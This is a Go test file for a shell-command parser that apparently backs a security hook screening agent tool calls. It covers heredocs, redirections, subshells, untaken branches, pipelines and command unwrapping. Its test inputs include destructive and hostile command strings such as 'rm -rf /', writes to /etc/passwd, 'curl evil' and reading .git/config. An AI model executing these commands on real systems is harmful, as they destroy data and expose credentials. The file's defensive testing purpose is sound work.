		for _, leaf := range sp.Leaves {
			if leaf.Executable == "echo" && len(leaf.Args) == 1 && leaf.Args[0] == "after" {
				found = true
			}
		}
		if !found {
			t.Errorf("the following command was swallowed: %s", dumpLeaves(sp.Leaves))
		}
	})
}

// TestShellParse_FdPrefixedHeredocHasNoPhantomOperand is the test OWED to
// pg2-14vjq by ADR 0039's Enforcement, written against its ORIGINAL reproducer:
// it MUST assert that `2<<EOF` does not leak into the ARGUMENT LIST, not merely
// that the leaf is heredoc-bearing (which already passed before and so could not
// catch a regression).
func TestShellParse_FdPrefixedHeredocHasNoPhantomOperand(t *testing.T) {
	sp := ParseShell("cat 2<<EOF\nbody\nEOF")
	if len(sp.Leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
	}
	leaf := sp.Leaves[0]
	if !leaf.HasHeredoc {
		t.Error("the fd-prefixed heredoc form must still flag the leaf heredoc-bearing")
	}
	for _, a := range leaf.Args {
		if strings.Contains(a, "<<") || a == "EOF" || a == "2" {
			t.Errorf("phantom heredoc operand leaked into the argument list: %v", leaf.Args)
		}
	}
	if len(leaf.Args) != 0 {
		t.Errorf("args = %v, want none", leaf.Args)
	}
}

// TestShellParse_DoneDelimSegmentSurvives is the other half of pg2-14vjq's owed
// test: the `done <<DELIM` segment used to be DROPPED with its extent.
func TestShellParse_DoneDelimSegmentSurvives(t *testing.T) {
	sp := ParseShell("while read c; do echo $c; done <<DELIM\n$(rm -rf /)\nDELIM")
	var withExtent int
	for _, leaf := range sp.Leaves {
		withExtent += len(leaf.Heredocs)
	}
	if withExtent != 1 {
		t.Fatalf("the loop terminator's heredoc extent was dropped: %s", dumpLeaves(sp.Leaves))
	}
	var bodies []string
	for _, leaf := range sp.Leaves {
		bodies = append(bodies, leaf.UnquotedHeredocBodies()...)
	}
	if len(bodies) != 1 || !strings.Contains(bodies[0], "rm -rf /") {
		t.Errorf("the expanding body never reached a leaf: %v", bodies)
	}
}

// TestShellParse_BareSubshellNotTruncated is the test owed to pg2-s26v5: the
// `(echo ')'; ls)` reproducer must keep `ls`.
func TestShellParse_BareSubshellNotTruncated(t *testing.T) {
	sp := ParseShell(`(echo ')'; ls)`)
	var execs []string
	for _, leaf := range sp.Leaves {
		execs = append(execs, leaf.Executable)
	}
	if !contains(execs, "ls") {
		t.Errorf("the subshell was truncated at the quoted paren: %v", execs)
	}
}

// TestShellParse_ProcessSubstitutionOperand pins BOTH halves of the process
// substitution lowering. Emitting the substitution's SOURCE TEXT as the operand
// causes mass new abstains from the redirect-target check; emitting NOTHING loses
// the operand. The fabricated `/dev/fd/63` is what the outgoing front end produced
// and what stops the check demoting the leaf.
func TestShellParse_ProcessSubstitutionOperand(t *testing.T) {
	sp := ParseShell("diff <(a b) >(c)")
	if len(sp.Leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d: %s", len(sp.Leaves), dumpLeaves(sp.Leaves))
	}
	leaf := sp.Leaves[0]
	want := []string{"/dev/fd/63", "/dev/fd/63"}
	if len(leaf.Args) != 2 || leaf.Args[0] != want[0] || leaf.Args[1] != want[1] {
		t.Errorf("args = %v, want %v", leaf.Args, want)
	}
	if len(leaf.ProcessSubstitutions) != 2 ||
		leaf.ProcessSubstitutions[0] != "a b" || leaf.ProcessSubstitutions[1] != "c" {
		t.Errorf("process substitutions = %v, want [a b, c]", leaf.ProcessSubstitutions)
	}

	// pg2-qvn6a: `A=<(evil)` must expose `evil` as a walkable leaf. In an ASSIGNMENT
	// value the substitution stays inside the value text, which the engine's
	// env-value recursion walks; what matters is that the value is not silently
	// emptied.
	assign := ParseShell("A=<(evil) cmd")
	if len(assign.Leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d", len(assign.Leaves))
	}
	if len(assign.Leaves[0].EnvVars) != 1 || !strings.Contains(assign.Leaves[0].EnvVars[0].Value, "evil") {
		t.Errorf("the assignment's process substitution was lost: %v", assign.Leaves[0].EnvVars)
	}
}

// TestShellParse_RedirectionGrammar pins the operator/kind mapping against the
// outgoing grammar, including the tc-xs8x spellings whose absence was a live
// security bypass, and the `2>&1` fd-duplication drop.
func TestShellParse_RedirectionGrammar(t *testing.T) {
	cases := []struct {
		src      string
		operator string
		path     string
		kind     hookio.RedirectionKind
	}{
		{"echo x > f", ">", "f", hookio.RedirectStdout},
		{"echo x >> f", ">>", "f", hookio.RedirectStdout},
		{"echo pwned 1> /etc/passwd", "1>", "/etc/passwd", hookio.RedirectStdout},
		{"echo x 2> f", "2>", "f", hookio.RedirectStderr},
		{"echo x 9> f", "9>", "f", hookio.RedirectOtherFD},
		{"echo x >| f", ">|", "f", hookio.RedirectStdout},
		{"echo x <> f", "<>", "f", hookio.RedirectReadWrite},
		{"echo x &> f", "&>", "f", hookio.RedirectAll},
		{"echo x &>> f", "&>>", "f", hookio.RedirectAll},
		{"echo x >& f", ">&", "f", hookio.RedirectAll},
		{"echo x {fd}> f", "{fd}>", "f", hookio.RedirectOtherFD},
		{"cat < f", "<", "f", hookio.RedirectStdin},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			sp := ParseShell(tc.src)
			if len(sp.Leaves) == 0 {
				t.Fatalf("no leaves")
			}
			var got []hookio.Redirection
			for _, leaf := range sp.Leaves {
				got = append(got, leaf.Redirections...)
			}
			if len(got) != 1 {
				t.Fatalf("redirections = %v, want exactly 1", got)
			}
			if got[0].Operator != tc.operator || got[0].Path != tc.path || got[0].Kind != tc.kind {
				t.Errorf("got %+v, want operator=%q path=%q kind=%v",
					got[0], tc.operator, tc.path, tc.kind)
			}
		})
	}

	t.Run("fd duplication and close name no path", func(t *testing.T) {
		for _, src := range []string{"ls 2>&1", "ls 2>&-", "ls >&2", "cat 0<&3"} {
			sp := ParseShell(src)
			for _, leaf := range sp.Leaves {
				if len(leaf.Redirections) != 0 {
					t.Errorf("%q: fd duplication/close recorded as a path write: %v", src, leaf.Redirections)
				}
			}
		}
	})
}

// TestShellParse_UnparseableIsFirstClass pins I1b/I10: a whole-command parse
// failure is a first-class value that yields NO leaves, so no caller can read the
// empty list as "this command contains nothing".
func TestShellParse_UnparseableIsFirstClass(t *testing.T) {
	for _, src := range []string{
		`echo "unclosed`,
		`echo 'unclosed`,
		`(<)#<<0`,
		// Documented capability losses: the SHELL accepts an inline array assignment,
		// the parser rejects it ("inline variables cannot be arrays"). The direction is
		// safe — Abstain, never Approve — but it is a real loss and appears in the
		// replay. The STATEMENT-level array forms (`arr=(a b)`, `arr[0]=x` alone) are
		// unaffected and are pinned by TestShellParse_IndexedAssignmentReachesALeaf.
		"FOO=(a b) cmd",
		"arr[0]=x cmd",
	} {
		t.Run(src, func(t *testing.T) {
			sp := ParseShell(src)
			if !sp.Unparseable {
				t.Fatalf("want unparseable, got %d leaves: %s", len(sp.Leaves), dumpLeaves(sp.Leaves))
			}
			if len(sp.Leaves) != 0 {
				t.Errorf("an unparseable result must carry NO leaves; got %d", len(sp.Leaves))
			}
			if sp.Reason == "" {
				t.Error("an unparseable result must name its reason (I10)")
			}
		})
	}
}

// TestShellParse_UntakenBranchesAreCovered pins I14's static surrogate: every
// *syntax.CallExpr must be covered by a leaf INCLUDING nodes in untaken branches,
// because executedness is a runtime property CETA cannot know.
func TestShellParse_UntakenBranchesAreCovered(t *testing.T) {
	cases := []struct {
		src  string
		want []string
	}{
		{"if false; then rm -rf /; fi", []string{"false", "rm"}},
		{"if a; then b; else c; fi", []string{"a", "b", "c"}},
		{"if a; then b; elif c; then d; else e; fi", []string{"a", "b", "c", "d", "e"}},
		{"case $x in a) p;; b) q;; esac", []string{"p", "q"}},
		{"f() { danger; }", []string{"danger"}},
		{"a && b || c", []string{"a", "b", "c"}},
		{"time slow", []string{"slow"}},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			sp := ParseShell(tc.src)
			var execs []string
			for _, leaf := range sp.Leaves {
				if leaf.Executable != "" {
					execs = append(execs, leaf.Executable)
				}
			}
			for _, w := range tc.want {
				if !contains(execs, w) {
					t.Errorf("%q: %q reached no leaf (I14); got %v", tc.src, w, execs)
				}
			}
		})
	}
}

// TestShellParse_PipelineRelation pins that the pipeline relation the outgoing
// front end exposes survives the lowering: stages of one pipeline share an ID and
// are ordered, and DownstreamStages still answers.
func TestShellParse_PipelineRelation(t *testing.T) {
	sp := ParseShell("cat .git/config | grep url | tee /tmp/x")
	if len(sp.Leaves) != 3 {
		t.Fatalf("want 3 stages, got %d: %s", len(sp.Leaves), dumpLeaves(sp.Leaves))
	}
	for i, leaf := range sp.Leaves {
		if leaf.PipelineID != sp.Leaves[0].PipelineID {
			t.Errorf("stage %d has pipeline %d, want %d", i, leaf.PipelineID, sp.Leaves[0].PipelineID)
		}
		if leaf.PipelineIndex != i {
			t.Errorf("stage %d has index %d", i, leaf.PipelineIndex)
		}
	}
	down := DownstreamStages(sp.Leaves, sp.Leaves[0].Raw)
	if len(down) != 2 {
		t.Errorf("DownstreamStages = %d stages, want 2", len(down))
	}

	t.Run("separate statements are separate pipelines", func(t *testing.T) {
		sp := ParseShell("a | b && c")
		byID := map[int][]string{}
		for _, leaf := range sp.Leaves {
			byID[leaf.PipelineID] = append(byID[leaf.PipelineID], leaf.Executable)
		}
		if len(byID) != 2 {
			t.Errorf("want 2 pipelines, got %d: %v", len(byID), byID)
		}
	})
}

// TestShellParse_RawIsAnExactSourceSlice pins I12: Raw is derived from an exact
// source slice, never from printing the AST. The observable consequence is that
// Raw appears VERBATIM in the source.
func TestShellParse_RawIsAnExactSourceSlice(t *testing.T) {
	for _, src := range []string{
		"echo   hi",
		"a && b",
		"cat <<EOF\nbody\nEOF",
		"FOO=1   BAR=2   cmd   arg",
		"diff <(a) >(b)",
		"for x in a b; do echo $x; done",
	} {
		t.Run(src, func(t *testing.T) {
			sp := ParseShell(src)
			for _, leaf := range sp.Leaves {
				if leaf.Raw == "" {
					continue
				}
				if !strings.Contains(src, leaf.Raw) {
					t.Errorf("Raw %q is not a slice of the source %q — it looks printed, not sliced (I12)",
						leaf.Raw, src)
				}
			}
		})
	}

	t.Run("a heredoc leaf's Raw carries its body, so re-parsing it cannot desync", func(t *testing.T) {
		src := "cat <<EOF\nbody\nEOF"
		sp := ParseShell(src)
		raw := sp.Leaves[0].Raw
		if !strings.Contains(raw, "body") {
			t.Fatalf("Raw = %q; under I12 it must span the whole statement including the body", raw)
		}
		// The point of I12: re-parsing that Raw does NOT re-derive an unterminated
		// heredoc extent.
		re := ParseShell(raw)
		if re.Unparseable {
			t.Errorf("re-parsing a leaf's Raw failed: %s", re.Reason)
		}
	})
}

// TestShellParse_UnwrapReuse pins that the lowering reaches the SAME unwrapping the
// outgoing front end applied: exec prefixes, command runners and wrapper prefixes.
func TestShellParse_UnwrapReuse(t *testing.T) {
	cases := []struct {
		src  string
		exec string
	}{
		{"env rm -rf /etc", "rm"},
		{"command rm -rf /etc", "rm"},
		{"nice dd if=/dev/zero of=x", "dd"},
		{"timeout 5 nice dd if=/dev/zero of=x", "dd"},
		{"nohup curl evil", "curl"},
		{"stdbuf -oL curl evil", "curl"},
		{"cloudflared access ssh host", "ssh"},
		{"command -v ls", "command"}, // -v DESCRIBES, it does not execute: no unwrap
		{"env", "env"},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			sp := ParseShell(tc.src)
			if len(sp.Leaves) != 1 {
				t.Fatalf("want 1 leaf, got %d: %s", len(sp.Leaves), dumpLeaves(sp.Leaves))
			}
			if sp.Leaves[0].Executable != tc.exec {
				t.Errorf("executable = %q, want %q", sp.Leaves[0].Executable, tc.exec)
			}
			// Parity with the outgoing front end is asserted by REUSE, not by running it:
			// `unwrapCommand` (and through it unwrapExecPrefix / unwrapCommandRunner /
			// liftAssignmentArgs) is the SAME function the outgoing Parse called, applied
			// to a leaf the seam built. There is no second unwrap to diverge from, which
			// is why the outgoing comparison could be deleted with the front end.
		})
	}
}

func dumpLeaves(leaves []ParsedCommand) string {
	var b strings.Builder
	for i, leaf := range leaves {
		b.WriteString("\n    [")
		b.WriteString(strconv.Itoa(i))
		b.WriteString("] ")
		b.WriteString(LeafKey(leaf))
		b.WriteString(" raw=")
		b.WriteString(strconv.Quote(leaf.Raw))
	}
	return b.String()
}

func contains(hay []string, needle string) bool {
	for _, h := range hay {
		if h == needle {
			return true
		}
	}
	return false
}

// TestNormalizeCommand_ReKeyingIsAdopted replaces TestNormalizeCommandShell_ReKeying.
//
// Step 1 kept TWO spellings of the normaliser — `NormalizeCommand` over the outgoing
// front end and `NormalizeCommandShell` over the seam — so the re-keying ADR 0039's
// Consequences records ("any leaf-set change re-keys historical analysis buckets")
// could be MEASURED before it was adopted rather than discovered afterwards. This
// step ADOPTS it: `Parse` is the seam, so `NormalizeCommand` computes the new key and
// `NormalizeCommandShell` was a duplicate of it and is deleted.
//
// The consequence is real and is recorded here rather than in a comment: the
// hook-miss taxonomy's persisted grouping key changes for any command whose leaf set
// changed. Both halves are pinned — the bulk of history keeps its bucket, and a
// compound is re-keyed in the direction that makes the bucket ACCURATE.
func TestNormalizeCommand_ReKeyingIsAdopted(t *testing.T) {
	t.Run("keys that never involved a compound are unchanged", func(t *testing.T) {
		cases := map[string]string{
			"ls -la":                 "ls -la",
			"git status --porcelain": "git status --porcelain",
			"cd foo && work":         "cd foo && work",
			"cd foo\nwork":           "cd foo && work",
			"cat f | grep x":         "cat f && grep x",
		}
		for src, want := range cases {
			if got := NormalizeCommand(src, "", ""); got != want {
				t.Errorf("NormalizeCommand(%q) = %q, want %q", src, got, want)
			}
		}
	})

	t.Run("newline and && forms still collapse to one key", func(t *testing.T) {
		if a, b := NormalizeCommand("cd foo && work", "", ""), NormalizeCommand("cd foo\nwork", "", ""); a != b {
			t.Errorf("the newline and && spellings must share a key: %q vs %q", a, b)
		}
	})

	t.Run("a compound is re-keyed away from keyword pseudo-leaves", func(t *testing.T) {
		// The outgoing front end keyed this as `if false && then rm -rf / && fi` —
		// three of whose four "commands" are shell keywords. The new key holds the one
		// command the compound actually contains.
		got := NormalizeCommand("if false; then rm -rf /; fi", "", "")
		if strings.Contains(got, "if ") || strings.Contains(got, "then ") || strings.Contains(got, "fi") {
			t.Errorf("key %q still carries a keyword pseudo-leaf", got)
		}
		if !strings.Contains(got, "rm -rf /") || !strings.Contains(got, "false") {
			t.Errorf("key %q lost a real command", got)
		}
	})

	t.Run("an unparseable command falls back to the trimmed source", func(t *testing.T) {
		src := `  echo "unclosed  `
		if got, want := NormalizeCommand(src, "", ""), strings.TrimSpace(src); got != want {
			t.Errorf("got %q, want %q", got, want)
		}
	})
}

// FuzzShellParseSeam fuzzes the SEAM. It does not assert parity with the outgoing
// front end — the census does that over real corpus text, and a fuzzer's inputs are
// not shell anyone wrote — so it asserts the properties the seam owns:
//
//   - it TERMINATES and does not panic on arbitrary bytes (the hook runs on every
//     tool call, so a stack overflow or a panic is a denial of service, and the
//     fail-safe contract is Abstain, not a crash);
//   - an Unparseable result carries ZERO leaves and a non-empty reason, so no caller
//     can read the empty list as "this command contains nothing" (I1b/I10);
//   - every leaf's Raw is an exact SLICE of the source, never printed AST (I12).
//
// The third property is what ADR 0039's Decision item 4 buys: it makes the
// idempotence invariant meaningful rather than vacuous.
func FuzzShellParseSeam(f *testing.F) {
	for _, seed := range []string{
		"", " ", "echo hi", "a && b | c", "cat <<EOF\nx\nEOF", "for f in *; do echo $f; done",
		"if a; then b; else c; fi", "case $x in a) p;; esac", `diff <(a) >(b)`,
		"FOO=1 env BAR=2 cmd", "export A=1 B", `m[$k]=$(x)`, "grep x <<<'y'",
		`echo "unclosed`, "(<)#<<0", "cat 2<<EOF\nx\nEOF", "a=(1 2)", "!(a)", "{ a; } > f",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		sp := ParseShell(cmd)
		if sp.Unparseable {
			if len(sp.Leaves) != 0 {
				t.Fatalf("ParseShell(%q): unparseable yet carries %d leaves; a caller could read them as an inventory (I1b)",
					cmd, len(sp.Leaves))
			}
			if sp.Reason == "" {
				t.Fatalf("ParseShell(%q): unparseable with no reason (I10)", cmd)
			}
			return
		}
		for i, leaf := range sp.Leaves {
			if leaf.Raw == "" {
				continue
			}
			if !strings.Contains(cmd, leaf.Raw) {
				t.Fatalf("ParseShell(%q): leaf %d Raw %q is not a slice of the source — printed, not sliced (I12)",
					cmd, i, leaf.Raw)
			}
		}
	})
}
